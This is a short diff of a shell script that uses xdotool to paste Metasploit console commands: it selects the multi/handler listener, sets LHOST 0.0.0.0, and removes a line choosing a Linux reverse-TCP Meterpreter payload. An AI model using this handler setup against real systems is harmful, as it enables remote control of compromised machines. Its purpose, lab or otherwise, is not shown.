@@ -10,10 +10,6 @@ paste_command "use multi/handler"
 xdotool key Return
 sleep 1
 
-paste_command "set payload linux/x86/meterpreter/reverse_tcp"
-xdotool key Return
-sleep 1
-
 paste_command "set LHOST 0.0.0.0"
 xdotool key Return
 sleep 1
